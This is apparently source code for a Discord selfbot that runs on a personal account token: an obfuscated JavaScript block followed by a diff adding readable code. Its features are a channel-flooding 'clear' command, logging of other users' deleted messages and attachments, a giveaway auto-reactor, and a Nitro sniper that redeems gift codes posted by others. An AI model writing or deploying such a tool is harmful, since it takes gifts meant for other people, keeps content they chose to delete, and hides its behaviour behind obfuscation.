_0x1b369a[_0x1be328(0x49d,0x317)][_0x1be328(0x4c0,0x516)](_0x1be328(0x4b9,0x4e5));_0x1b369a['channel'][_0x1be328(0x4c0,0x5ba)](_0x1748bb[_0x1be328(0x5c6,0x600)]('\x20')[_0x1be328(0x67f,0x710)]('')[_0x1be328(0x5e5,0x775)]()['join'](''));}if(_0x390a85===_0x1be328(0x6a9,0x715)){console[_0x1be328(0x6da,0x835)]('['+colors[_0x1be328(0x57b,0x512)](moment()[_0x1be328(0x4bf,0x356)]()[_0x1be328(0x6ed,0x824)](_0x1be328(0x5fa,0x616)))+']\x20'+colors[_0x1be328(0x632,0x4d4)](_0x1be328(0x596,0x693))+'\x20'+colors[_0x1be328(0x5db,0x4bd)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x726)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x81d)]&&_0x1b369a[_0x1be328(0x594,0x458)]();if(!_0x1748bb[_0x1be328(0x5c6,0x5a1)]('\x20'))return _0x1b369a[_0x1be328(0x49d,0x49b)][_0x1be328(0x4c0,0x36a)](_0x1be328(0x4ce,0x56e));msg=_0x1748bb[_0x1be328(0x5c6,0x643)]('\x20'),figlet['text'](msg,function(_0xc2d177,_0x2fb66b){const _0x276ac6=function(_0xb39d29,_0x4be8c3){return _0x1be328(_0x4be8c3- -0x322,_0xb39d29);};_0xc2d177&&console[_0x276ac6(0x518,0x3b8)](_0x276ac6(0x306,0x42f)+_0xc2d177);if(_0x2fb66b[_0x276ac6(0x1a0,0x215)]>-0x124f*0x2+-0x1a35*-0x1+0xf*0x137)return _0x1b369a[_0x276ac6(0x1db,0x355)](_0x276ac6(0x462,0x3fa));_0x1b369a[_0x276ac6(0x267,0x17b)][_0x276ac6(0x2b8,0x19e)](_0x276ac6(0x289,0x408)+_0x2fb66b+_0x276ac6(0x56b,0x408));});}}else return;}),bot['on'](_0x5c3a6a(0x24a,0x1f5),_0x46d8ed=>{const _0x4ab1fb=function(_0x177c15,_0x39f681){return _0x5c3a6a(_0x39f681- -0x53,_0x177c15);};if(_0x46d8ed[_0x4ab1fb(0x1cd,0x1ca)][_0x4ab1fb(0x2d7,0x1a0)])return;const _0x757e29=bot[_0x4ab1fb(0xe,0xaa)][_0x4ab1fb(0x310,0x287)](_0x46d8ed[_0x4ab1fb(-0x81,0x70)]['id'])||[],_0x3b516f={};_0x3b516f[_0x4ab1fb(0x230,0x364)]=_0x4ab1fb(0x143,0x135),_0x3b516f[_0x4ab1fb(0x36d,0x345)]=_0x4ab1fb(0x4d,0x144);const _0x4717ed={};_0x4717ed[_0x4ab1fb(0xe3,0xcb)]=_0x46d8ed[_0x4ab1fb(-0x74,0xcb)],_0x4717ed[_0x4ab1fb(0xb8,0x1ca)]=_0x46d8ed[_0x4ab1fb(0x9e,0x1ca)],_0x4717ed[_0x4ab1fb(0x2b7,0x325)]=_0x46d8ed[_0x4ab1fb(0x2b3,0x35d)][_0x4ab1fb(0x126,0x278)]()?_0x46d8ed[_0x4ab1fb(0x3cb,0x35d)][_0x4ab1fb(0x20c,0x278)]()[_0x4ab1fb(0x227,0x336)]:null,_0x4717ed[_0x4ab1fb(0x3de,0x2ba)]=new Date()[_0x4ab1fb(0x462,0x2e7)](_0x4ab1fb(0x194,0x1da),_0x3b516f),_0x757e29[_0x4ab1fb(0x184,0x25b)](_0x4717ed),_0x757e29[_0x4ab1fb(0x309,0x1e4)](-0xa7c+0x15ce+0x13*-0x98),bot[_0x4ab1fb(0x222,0xaa)][_0x4ab1fb(0x2c6,0x161)](_0x46d8ed[_0x4ab1fb(-0x9d,0x70)]['id'],_0x757e29);}),bot['on'](_0x5c3a6a(0x337,0x2df),async _0x166b03=>{const _0x14a5d=function(_0x4f69ef,_0x58d828){return _0x5c3a6a(_0x58d828-0x3ab,_0x4f69ef);},_0x3150a5=process[_0x14a5d(0x533,0x5af)](),_0x53d5d2=process[_0x14a5d(0x66a,0x5af)](_0x3150a5),_0x659f36={};_0x659f36[_0x14a5d(0x5e7,0x762)]=_0x14a5d(0x474,0x533),_0x659f36[_0x14a5d(0x699,0x743)]=_0x14a5d(0x584,0x542);const _0x1ed53d=new Date()[_0x14a5d(0x79a,0x6e5)](_0x14a5d(0x6c9,0x5d8),_0x659f36);function _0x4bd6f6(_0x102b59){const _0x19ca28=function(_0x5a01db,_0x352541){return _0x14a5d(_0x352541,_0x5a01db- -0x203);};console[_0x19ca28(0x4a8,0x43b)]('-\x20CHANNEL:\x20'+colors[_0x19ca28(0x3c3,0x48f)](''+_0x166b03[_0x19ca28(0x26b,0x2b6)][_0x19ca28(0x3ae,0x268)])),console[_0x19ca28(0x4a8,0x549)](_0x19ca28(0x27b,0x1a4)+colors[_0x19ca28(0x3c3,0x28f)](''+_0x166b03[_0x19ca28(0x36a,0x4b6)][_0x19ca28(0x3ae,0x236)])),console[_0x19ca28(0x4a8,0x33e)](_0x19ca28(0x535,0x686)+colors[_0x19ca28(0x3c3,0x483)](''+_0x166b03['author'][_0x19ca28(0x488,0x355)])),console[_0x19ca28(0x4a8,0x351)](_0x19ca28(0x51c,0x57e)+colors[_0x19ca28(0x3c3,0x287)](''+(_0x53d5d2[0x11c5+0x19a0+-0x7*0x633]>-0x493*-0x3+-0x2556+0x4b9*0x5?_0x53d5d2[-0x6af*0x1+-0x943+0x13a*0xd]+'s\x20':'')+_0x53d5d2[0x6f0+0x4f*0x25+-0xa2*0x1d]/(-0x10106+0x186879+-0x82533)+'ms')),console[_0x19ca28(0x4a8,0x3ad)](_0x19ca28(0x2cf,0x2d7)+colors[_0x19ca28(0x3c3,0x53b)](''+_0x102b59)),console[_0x19ca28(0x4a8,0x54c)]();}function _0x4c63c5(){const _0x7909fa=function(_0x4a6390,_0x1df934){return _0x14a5d(_0x4a6390,_0x1df934-0xc3);};console['log'](_0x7909fa(0x6c9,0x55a)+colors['yellow'](''+_0x166b03[_0x7909fa(0x49a,0x531)][_0x7909fa(0x62e,0x674)])),console[_0x7909fa(0x7f9,0x76e)](_0x7909fa(0x5af,0x541)+colors[_0x7909fa(0x646,0x689)](''+_0x166b03[_0x7909fa(0x5dd,0x630)][_0x7909fa(0x63b,0x674)])),console[_0x7909fa(0x8f5,0x76e)]();}if(_0x166b03[_0x14a5d(0x551,0x4c9)][_0x14a5d(0x69f,0x5bf)](_0x14a5d(0x6f5,0x62c))){if(config[_0x14a5d(0x7fa,0x724)]===!![]){if(_0x166b03[_0x14a5d(0x73e,0x5c8)]['id']===_0x14a5d(0x539,0x697))try{_0x166b03[_0x14a5d(0x56b,0x64c)]('🎉'),console[_0x14a5d(0x5bf,0x6ab)](''+colors[_0x14a5d(0x5a4,0x603)]('['+_0x1ed53d+_0x14a5d(0x79a,0x711))),_0x4c63c5();}catch(_0x1084f2){console[_0x14a5d(0x82f,0x6ab)](''+colors[_0x14a5d(0x687,0x603)]('['+_0x1ed53d+_0x14a5d(0x468,0x585)));}}else return;}if(_0x166b03[_0x14a5d(0x3bf,0x4c9)][_0x14a5d(0x559,0x5bf)](_0x14a5d(0x5bd,0x691)+bot[_0x14a5d(0x612,0x4bf)]['id']+'>')){if(config[_0x14a5d(0x782,0x724)]===!![])_0x166b03[_0x14a5d(0x4ee,0x5c8)]['id']===_0x14a5d(0x66e,0x697)&&(console[_0x14a5d(0x813,0x6ab)](''+colors[_0x14a5d(0x4e8,0x603)]('['+_0x1ed53d+_0x14a5d(0x781,0x711))),_0x4c63c5());else return;}if(_0x166b03[_0x14a5d(0x449,0x4c9)][_0x14a5d(0x454,0x5bf)](_0x14a5d(0x87e,0x72d))||_0x166b03[_0x14a5d(0x473,0x4c9)][_0x14a5d(0x444,0x5bf)](_0x14a5d(0x5c5,0x755))){if(config[_0x14a5d(0x4b6,0x459)]===!![]){var _0x34074b=/(discord\.(gift)|discord\.com\/gift)\/.+[a-z]/,_0x4f0b9a=_0x34074b[_0x14a5d(0x635,0x633)](_0x166b03[_0x14a5d(0x58a,0x4c9)]),_0x4c3fb8=_0x4f0b9a[0x8f4+0x18f1+-0x21e5][_0x14a5d(0x76d,0x650)]('/')[-0x1d6+0x1eb7*-0x1+0x208e];const _0x1bcf88={};_0x1bcf88[_0x14a5d(0x31c,0x46b)]=config[_0x14a5d(0x7cd,0x751)];const _0x111e41={};_0x111e41[_0x14a5d(0x617,0x4b8)]=_0x14a5d(0x586,0x70a),_0x111e41[_0x14a5d(0x6e6,0x5b9)]=_0x14a5d(0x58c,0x581)+_0x4c3fb8+_0x14a5d(0x565,0x48c),_0x111e41[_0x14a5d(0x545,0x57c)]=_0x1bcf88,axios(_0x111e41)[_0x14a5d(0x6ff,0x64e)](()=>{const _0x402e88=function(_0x3fdf5f,_0xedb2c1){return _0x14a5d(_0xedb2c1,_0x3fdf5f- -0x56);};console[_0x402e88(0x655,0x6d9)](colors[_0x402e88(0x4f6,0x3ed)]('['+_0x1ed53d+_0x402e88(0x48e,0x510))),_0x4bd6f6(_0x4c3fb8);})[_0x14a5d(0x861,0x6d4)](_0x15a67d=>{const _0x32146e=function(_0x2a9840,_0x5631cd){return _0x14a5d(_0x2a9840,_0x5631cd- -0x29e);};console[_0x32146e(0x4d2,0x40d)](colors[_0x32146e(0x4e3,0x461)]('['+_0x1ed53d+_0x32146e(0x521,0x435))),_0x4bd6f6(_0x4c3fb8);});}else return;}});if(config[_0x5c3a6a(0x3a6,0x324)]===_0x5c3a6a(0xb0,0xf))return console[_0x5c3a6a(0x300,0x1fc)](colors[_0x5c3a6a(0x354,0x40a)](_0x5c3a6a(0xc1,0x97))+'\x20'+colors['yellow']('You\x20didn\x27t\x20specify\x20a\x20token\x20in\x20config.json'));else bot[_0x5c3a6a(0x239,0x275)](config[_0x5c3a6a(0x3a6,0x50c)]);
+            Your activity was successfully reset${footer ? `\n\n${footer}` : null}
+            \`\`\``)
+        }
+    }
+
+    if(cmd === "clear") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        message.channel.send("\u200b\n".repeat(400))
+    }
+
+    if(cmd === "reverse") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!args.join(" ")) return message.channel.send("Please provide some text.")
+        message.channel.send(args.join(" ").split("").reverse().join(""))
+    }
+
+    if(cmd === "ascii") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!args.join(" ")) return message.channel.send("Please provide some text!")
+        msg = args.join(" ")
+    
+        figlet.text(msg, function(err, data) {
+            if(err) {
+                console.log(`Uh Oh, an error has occurred. Error ${err}`);
+            }
+            if(data.length > 2000) return message.reply("Please provide text shorter that 2000 characters.")
+    
+                message.channel.send("```" + data + "```")
+            })
+    }
+} else {
+    return;
+}
+})
+
+bot.on("messageDelete", message => {
+    if(message.author.bot) return;
+    const snipes = bot.snipes.get(message.channel.id) || [];
+    snipes.unshift({
+        content: message.content,
+        author: message.author,
+        attachment: message.attachments.first() ? message.attachments.first().proxyURL : null,
+        date: new Date().toLocaleString("en-GB", { dataStyle: "full", timeStyle: "short"})
+    })
+    snipes.splice(10);
+    bot.snipes.set(message.channel.id, snipes)
+})
+
+bot.on("message", async(message) => {
+    const start = process.hrtime();
+    const difference = process.hrtime(start);
+
+    const time = new Date().toLocaleString("en-GB", { dataStyle: "full", timeStyle: "short"})
+
+    function nitroData(code) {
+        console.log(`- CHANNEL: ${colors.yellow(`${message.channel.name}`)}`)
+        console.log(`- SERVER: ${colors.yellow(`${message.guild.name}`)}`)
+        console.log(`- AUTHOR: ${colors.yellow(`${message.author.tag}`)}`)
+        console.log(`- ELAPSED: ${colors.yellow(`${difference[0] > 0 ? `${difference[0]}s ` : ""}${difference[1] / 1e6}ms`)}`)
+        console.log(`- CODE: ${colors.yellow(`${code}`)}`)
+        console.log()  
+    }
+
+    function giveawayData() {
+        console.log(`- CHANNEL: ${colors.yellow(`${message.channel.name}`)}`)
+        console.log(`- SERVER: ${colors.yellow(`${message.guild.name}`)}`)
+        console.log()
+    }
+
+    if(message.content.includes("GIVEAWAY")) {
+        if(config.giveaway_sniper === true) {
+            if(message.author.id === "294882584201003009") {
+                try {
+                    message.react("🎉")
+                    console.log(`${colors.cyan(`[${time} - Giveaway Sniped]`)}`)
+                    giveawayData()
+                } catch(err) {
+                    console.log(`${colors.cyan(`[${time} - Giveaway Couldn't React]`)}`)
+                }
+            }
+        } else {
+            return;
+        }
+    }
+
+    if(message.content.includes(`Congratulations <@${bot.user.id}>`)) {
+        if(config.giveaway_sniper === true) {
+            if(message.author.id === "294882584201003009") {
+                console.log(`${colors.cyan(`[${time} - Giveaway Sniped]`)}`)
+                giveawayData()
+            }
+        } else {
+            return;
+        }
+    }
+
+    if(message.content.includes("https://discord.gift/") || message.content.includes("discord.gift")) {
+        if(config.nitro_sniper === true) {
+
+        var Nitro = /(discord\.(gift)|discord\.com\/gift)\/.+[a-z]/
+
+        var NitroUrl = Nitro.exec(message.content);
+        var NitroCode = NitroUrl[0].split('/')[1];
+
+        axios({
+            method: 'POST',
+            url: `https://discord.com/api/v6/entitlements/gift-codes/${NitroCode}/redeem`,
+            headers:
+            {
+                'Authorization': config.token
+            }
+        }).then(() => {
+            console.log(colors.green(`[${time} - Valid nitro code was successfully redeemed]`))
+            nitroData(NitroCode)
+        })
+        .catch(ex => {
+        console.log(colors.red(`[${time} - Unknown nitro code was either redeemed or invalid/fake]`))
+        nitroData(NitroCode)
+        })
+        } else {
+            return;
+        } 
+    }
+})
+
+if(config.token === "token-here") {
+    return console.log(`${colors.red("[ERROR]:")} ${colors.yellow("You didn't specify a token in config.json")}`)
+} else {
+    bot.login(config.token)
+}
